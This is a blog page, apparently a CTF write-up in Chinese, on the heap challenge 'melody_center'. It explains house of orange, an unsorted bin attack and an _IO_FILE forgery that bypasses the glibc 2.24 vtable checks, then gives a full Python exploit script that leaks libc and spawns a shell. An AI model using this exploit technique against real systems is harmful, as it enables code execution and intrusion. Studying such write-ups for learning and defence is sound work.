@@ -1,0 +1,190 @@
+<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content=""><title>pwn heap: melody_center | Nop</title><link rel="stylesheet" type="text/css" href="/css/style.css"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.png"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Nop" type="application/atom+xml">
+</head><link rel="stylesheet" type="text/css" href="/css/customize.css"><link rel="stylesheet" type="text/css" href="/plugins/prettify/doxy.css"><script type="text/javascript" src="/js/ready.js" async></script><body><div class="mobile-head" id="mobile-head"><div class="navbar-icon"><span></span><span></span><span></span></div><div class="navbar-title"><a href="/">LITREILY</a></div><div class="navbar-search"><!--= show a circle here--></div></div><div class="h-wrapper" id="menu"><nav class="h-head box"><div class="m-hdimg"><a class="hdimg img" href="/"><img class="nofancybox" src="/img/profile.jpg" width="128" height="128"></a><h1 class="ttl"><a href="/">Nop</a></h1></div><p class="m-desc">There is a long way to go</p><div class="m-nav"><ul><li><span class="dot">●</span><a href="/archives/">Archives</a></li><li><span class="dot">●</span><a href="/categories/">Categories</a></li><li><span class="dot">●</span><a href="/tags/">Tags</a></li><li><span class="dot">●</span><a href="/about/">About</a></li><li><span class="dot">●</span><a href="/atom.xml">RSS</a></li><li class="m-sch"><form class="form" id="j-formsch" method="get"><input class="txt" type="text" id="local-search-input" name="q" value="Search" onfocus="if(this.value=='Search'){this.value='';}" onblur="if(this.value==''){this.value='Search';}"><input type="text" style="display:none;"></form></li></ul><div id="local-search-result"></div></div></nav></div><div id="back2Top"><a class="fa fa-arrow-up" title="Back to top" href="#"></a></div><div class="box" id="container"><div class="l-wrapper"><div class="l-content box"><div class="l-post l-post-art"><article class="p-art"><div class="p-header box"><h1 class="p-title">pwn heap: melody_center</h1><div class="p-info"><span class="p-date"><i class="fa fa-calendar"></i><a href="/2020/02/07/pwn-heap-melody-center/">2020-02-07</a></span><span class="p-category"><i class="fa fa-folder"></i><a href="/categories/Writeup/">Writeup</a></span><span class="p-view" id="busuanzi_container_page_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_page_pv"></span></span></div></div><div class="p-content"><p>第一次接触house of orange + unsorted bin attack + IO_FILE的堆题，大佬们秒的题我硬是做了两三天才搞出来，结果远程打通了反而本地没打通，本地的问题就先放一放以后再解决了。</p>
+<h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>保护全开，题目给了四个功能：</p>
+<pre><code>1. Create                      
+2. Edit                        
+3. Show                        
+4. Exit</code></pre><p>其中Create功能中malloc了3个chunk，第二个chunk的大小是可控的，但不超过0x900，第三个chunk的前8个字节是可控的，为两个signed int型的整数，第一个chunk中存了另外两个chunk的地址，以及第一个堆块的地址存在全局变量中（这两个没什么作用）。该功能限制使用4次。</p>
+<pre><code>           (chunk_1)+----+----+
+                    |    |0x31|          +----+----+(chunk_2)
+                    +----+----+          |    |size|
+              +-----|    |    |--------&gt; +----+----+
+              |     +----+----+          |    |    |
+              |     |    |    |          +----+----+
+              |     +----+----+          |    |    |
+              |                          +----+----+
+              |                          ...........
+              |                          +----+----+(chunk_3)
+              |                          |    |0x21|
+              |                          +----+----+
+              +------------------------&gt; |    |    |
+                                         +----+----+</code></pre><p><br />Edit功能可以修改chunk_2中的数据，由于size可以重新给定，这里存在一个堆溢出可以利用。该功能限制使用1次。<br><br />Show功能用来输出chunk_2中的数据。该功能限制使用2次。<br><br />Exit就是调用exit(0)（用不上）</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ul>
+<li><p>题目没有提供free函数，需要利用house of orange得到一个unsorted bin</p>
+</li>
+<li><p>由于题目提供的输入函数没有在字符串末尾补0，可以利用这一点leak出libc的基址（unsorted bin-&gt;bk)</p>
+</li>
+<li><p>需要使用_IO_FILE结构攻击，低版本下（glibc&lt;=2.23)是通过伪造vtable进行的。但是题目提供的glibc==2.24，添加了新的检查机制（vtable必须要满足在<code>__stop___IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间），这里需要利用<code>_IO_str_jumps</code>结构体进行绕过，因为它不在检查范围之内。这里需要用到malloc_printerr调用链，最终执行的会是<code>_IO_str_overflow</code>。</p>
+<pre><code>malloc_printerr-&gt; __libc_message—&gt;abort-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</code></pre><p>但最终需要的是调用<code>_IO_str_finish</code>，利用<code>(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)</code>完成<code>system(&quot;/bin/sh&quot;)</code>。</p>
+<pre><code class="C">_IO_str_finish (_IO_FILE *fp, int dummy)
+{
+if (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))
+  (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);  //[fp+0xe8]
+fp-&gt;_IO_buf_base = NULL;
+
+_IO_default_finish (fp, 0);
+}</code></pre>
+</li>
+<li><p>通过unsorted bin attack，将<code>_IO_list_all</code>改为<code>main_arena+0x58</code>即main_arena中unsorted bin的位置，此时<code>_IO_list_all-&gt;_chain</code>将指向<code>main_arena+0x58+0x68</code>main_arena中size=0x60的small bin，这个small bin以及其中的内容可以通过Edit中的堆溢出利用得到。当unsorted bin因为unsorted bin attack被破坏时，再次遍历会出错，会调用malloc_printerr。</p>
+</li>
+<li><p>伪造的IO_FILE结构体即<code>_IO_list_all-&gt;_chain</code>指向的结构体需要满足：</p>
+<ol>
+<li><code>fp-&gt;_mode</code> = 0</li>
+<li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li>
+<li><code>fp-&gt;_IO_read_ptr</code> = 0x61 , smallbin4 + 8 (smallbin size)</li>
+<li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all</code> -0x10 , smallbin-&gt;bk, unsorted bin attack （以上为绕过<code>_IO_flush_all_lockp</code>的条件）</li>
+<li>vtable = <code>_IO_str_jumps</code> - 8 ，这样调用<code>_IO_overflow</code>时会调用到     <code>_IO_str_finish</code></li>
+<li><code>fp-&gt;_flags</code>= 0</li>
+<li><code>fp-&gt;_IO_buf_base</code> = <code>binsh_addr</code></li>
+<li><code>fp+0xe8</code> = system_addr</li>
+</ol>
+</li>
+</ul>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">def create(size, content, _217, _108):
+    p.sendlineafter(&quot;Your choice:&quot;, &quot;1&quot;)
+    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))
+    p.sendafter(&quot;Content: &quot;, content)
+    p.sendlineafter(&quot;217: &quot;, str(_217))
+    p.sendlineafter(&quot;108: &quot;, str(_108))
+
+def edit(size, content, _217, _108):
+    p.sendlineafter(&quot;Your choice:&quot;, &quot;2&quot;)
+    p.sendlineafter(&quot;Size of Heap: &quot;, str(size))
+    p.sendafter(&quot;Content: &quot;, content)
+    p.sendlineafter(&quot;217: &quot;, str(_217))
+    p.sendlineafter(&quot;108: &quot;, str(_108))
+
+def show():
+    p.sendlineafter(&quot;Your choice:&quot;, &quot;3&quot;)
+    return p.recvuntil(&quot;==========&quot;)
+
+def exit():
+    p.sendlineafter(&quot;Your choice:&quot;, &quot;4&quot;)
+
+def pack_file(_flags = 0,
+              _IO_read_ptr = 0,
+              _IO_read_end = 0,
+              _IO_read_base = 0,
+              _IO_write_base = 0,
+              _IO_write_ptr = 0,
+              _IO_write_end = 0,
+              _IO_buf_base = 0,
+              _IO_buf_end = 0,
+              _IO_save_base = 0,
+              _IO_backup_base = 0,
+              _IO_save_end = 0,
+              _IO_marker = 0,
+              _IO_chain = 0,
+              _fileno = 0,
+              _lock = 0,
+              _wide_data = 0,
+              _mode = 0):
+    file_struct = p32(_flags) + \
+                  p32(0) + \
+                  p64(_IO_read_ptr) + \
+                  p64(_IO_read_end) + \
+                  p64(_IO_read_base) + \
+                  p64(_IO_write_base) + \
+                  p64(_IO_write_ptr) + \
+                  p64(_IO_write_end) + \
+                  p64(_IO_buf_base) + \
+                  p64(_IO_buf_end) + \
+                  p64(_IO_save_base) + \
+                  p64(_IO_backup_base) + \
+                  p64(_IO_save_end) + \
+                  p64(_IO_marker) + \
+                  p64(_IO_chain) + \
+                  p32(_fileno)
+
+    file_struct = file_struct.ljust(0x88, &quot;\x00&quot;)
+    file_struct += p64(_lock)
+    file_struct = file_struct.ljust(0xa0, &quot;\x00&quot;)
+    file_struct += p64(_wide_data)
+    file_struct = file_struct.ljust(0xc0, &#39;\x00&#39;)
+    file_struct += p64(_mode)
+    file_struct = file_struct.ljust(0xd8, &quot;\x00&quot;)
+
+    return file_struct
+
+def pack_file_flush_str_jumps(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr):
+    payload = pack_file(_flags = 0,
+                        _IO_read_ptr = 0x61, #smallbin5file_size
+                        _IO_read_end = main_arena_addr,
+                        _IO_read_base = _IO_list_all_ptr - 0x10, # unsorted bin attack _IO_list_all_ptr,
+                        _IO_write_base = 0,
+                        _IO_write_ptr = 1,
+                        _IO_buf_base = binsh_addr,
+                        _mode = 0,
+                        )
+
+    payload += p64(_IO_str_jumps_addr - 8)
+    payload += p64(0) # paddding
+    payload += p64(system_addr)
+
+    return payload
+
+main_arena_offset = 0x3c1b00
+_IO_list_all_offset = 0x3c2500
+_IO_str_jumps_offset = 0x3be4c0
+system_offset = 0x456a0
+str_bin_sh_offset = 0x18ac40
+
+# old top chunk ==&gt; unsorted bin
+create(0x8d8, &quot;A&quot; * 8 + &quot;\n&quot;, 217, 108)
+edit(0x900, &quot;A&quot; * 0x8d8 + p64(0x21) + &quot;A&quot; * 0x18 + p64(0x6d1), 217, 108)
+create(0x900, &quot;B&quot; * 8 + &quot;\n&quot;, 217, 108)
+
+# leak main_arena and then leak libc
+create(8, &quot;B&quot; * 8, 217, 108)
+res = show()
+main_arena = u64(res[0x18:0x1e].ljust(8, &#39;\x00&#39;))
+libc_base = main_arena - 0x58 - main_arena_offset
+_IO_list_all = libc_base + _IO_list_all_offset
+_IO_str_jumps = libc_base + _IO_str_jumps_offset
+system = libc_base + system_offset
+str_bin_sh = libc_base + str_bin_sh_offset
+
+# use unsorted bin attack to make _IO_list_all = main_arena + 0x58
+# thus _IO_list_all-&gt;_chains = main_arena + 0x58 + 0x68 ==&gt; small bin[5] (size = 0x60)
+# fake a _IO_FILE struct in small bin[4] by writing the unsorted bin
+# make use of _IO_str_jumps-&gt;_IO_str_finish
+payload = &quot;E&quot; * 0x30 
+payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena, system, str_bin_sh)
+edit(0x300, payload + &quot;\n&quot; , 217, 108)
+#create(0x100, &quot;D&quot; * 7 + &quot;\n&quot;, 217, 108)
+
+success(&quot;main_arena: &quot; + hex(main_arena))
+success(&quot;libc_base: &quot; + hex(libc_base))
+success(&quot;_IO_list_all: &quot; + hex(_IO_list_all))
+success(&quot;_IO_str_jumps: &quot; + hex(_IO_str_jumps))
+success(&quot;system: &quot; + hex(system))
+success(&quot;str_bin_sh: &quot; + hex(str_bin_sh))
+
+p.interactive()</code></pre>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ol>
+<li>在触发malloc_printerr之后，size=0x60的unsorted bin是怎么进入到small bin的机制还不是很清楚</li>
+<li>除了利用<code>_IO_str_finish</code>之外，还可以利用<code>_IO_str_overflow</code>，不过好像稍微复杂一点，没有尝试</li>
+<li>glibc==2.24的情况下利用IO_FILE结构体攻击的方法不限于此种，还有其他利用方法没有尝试</li>
+</ol>
+<h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>学习了其他大佬们的文章以及<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/exploit-in-libc2.24-zh/" target="_blank" rel="noopener">CTF wiki</a></p>
+<ol>
+<li><a href="https://xz.aliyun.com/t/5579" target="_blank" rel="noopener">https://xz.aliyun.com/t/5579</a></li>
+<li><a href="https://www.jianshu.com/p/1e45b785efc1" target="_blank" rel="noopener">https://www.jianshu.com/p/1e45b785efc1</a></li>
+</ol>
+</div><div class="p-copyright"><blockquote><div class="p-copyright-author"><span class="p-copyright-key">本文作者：</span><span class="p-copytight-value"><a href="mailto:litreily@163.com">Nop</a></span></div><div class="p-copyright-link"><span class="p-copyright-key">本文链接：</span><span class="p-copytight-value"><a href="/2020/02/07/pwn-heap-melody-center/">http://n0nop.com/2020/02/07/pwn-heap-melody-center/</a></span></div><div class="p-copyright-note"><span class="p-copyright-key">版权声明：</span><span class="p-copytight-value">本博客所有文章除特殊声明外，均采用<a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/"> CC BY-NC 4.0 </a>许可协议。转载请注明出处 <a href="http://n0nop.com">Nop的博客</a>！</span></div></blockquote></div></article><div class="p-info box"><span class="p-tags"><i class="fa fa-tags"></i><a href="/tags/CTF/">CTF</a><a href="/tags/pwn/">pwn</a></span></div></div><section class="p-ext"><div class="l-pager l-pager-dtl box"><a class="next" href="/2020/01/24/%E5%85%B3%E4%BA%8ETEE%E7%9A%84%E4%B8%80%E4%BA%9B%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/">关于TEE的一些预备知识 &gt;</a></div></section><footer><p>Copyright © 2016 - 2020 <a href="/." rel="nofollow">Nop</a> | <strong><a rel="nofollow" target="_blank" href="https://creativecommons.org/licenses/by-nc/4.0/">CC BY-NC 4.0</a></strong><br><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span></span> <span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span></span> | Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a>Theme with<a rel="nofollow" target="_blank" href="https://github.com/litreily/snark-hexo"> snark.</a></p></footer></div></div></div><script type="text/javascript" src="/plugins/prettify/prettify.js"></script><script type="text/javascript" src="/js/search.js"></script><script type="text/javascript" src="/js/top.js"></script><script type="text/javascript" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><script>var search_path = 'search.xml';
+if (search_path.length == 0) {
+    search_path = 'search.xml';
+}
+var path = '/' + search_path;
+searchFunc(path, 'local-search-input', 'local-search-result');
+</script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1" async></script><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/fancybox/3.3.5/jquery.fancybox.min.css"></body></html>
